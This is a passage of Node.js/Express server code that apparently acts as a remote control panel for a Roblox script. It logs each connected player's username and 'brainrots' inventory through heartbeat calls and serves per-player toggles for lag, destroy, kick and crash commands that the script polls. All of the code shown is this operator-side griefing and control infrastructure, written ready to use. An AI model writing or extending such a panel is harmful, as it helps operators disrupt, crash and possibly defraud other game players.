        <table>
          <tr><th>Player</th><th>Brainrots</th><th>Commands</th></tr>
          ${rows}
        </table>
        <div class="footer">
          <span>💀 DESTROY = sobrang lag | 🔄 Auto‑offline after 10s no heartbeat | 🗑️ Offline users auto‑removed after 1 hour</span>
        </div>
      </div>
    </body>
    </html>
  `);
});

// ===== TOGGLE COMMAND =====
app.post('/cmd', isAuth, (req, res) => {
  const { id, cmd } = req.body;
  if (!users[id]) users[id] = { commands: {}, lastHeartbeat: 0 };
  if (!users[id].commands) users[id].commands = {};
  users[id].commands[cmd] = !users[id].commands[cmd];
  res.redirect('/');
});

// ===== API: HEARTBEAT =====
app.post('/api/public/heartbeat', (req, res) => {
  const apiKey = req.headers['x-api-key'];
  if (apiKey !== API_KEY) return res.status(403).send('Invalid API key');
  const { user_id, username, brainrots } = req.body;
  if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
  if (!users[user_id]) users[user_id] = { commands: {} };
  users[user_id].username = username || 'Unknown';
  users[user_id].brainrots = brainrots || [];
  users[user_id].lastHeartbeat = Date.now();
  // online status will be computed on dashboard load
  res.json({ status: 'ok' });
});

// ===== API: COMMAND (ginagamit ng Roblox script) =====
app.get('/api/public/command', (req, res) => {
  const apiKey = req.headers['x-api-key'];
  if (apiKey !== API_KEY) return res.status(403).send('Invalid API key');
  const userId = req.query.user_id;
  if (!userId || !users[userId]) return res.json({});
  const c = users[userId].commands || {};
  res.json({
    lag_n: !!c.lag_n,
    lag_c: !!c.lag_c,
    destroy: !!c.destroy,
    kick: !!c.kick,
    crash: !!c.crash
  });
});

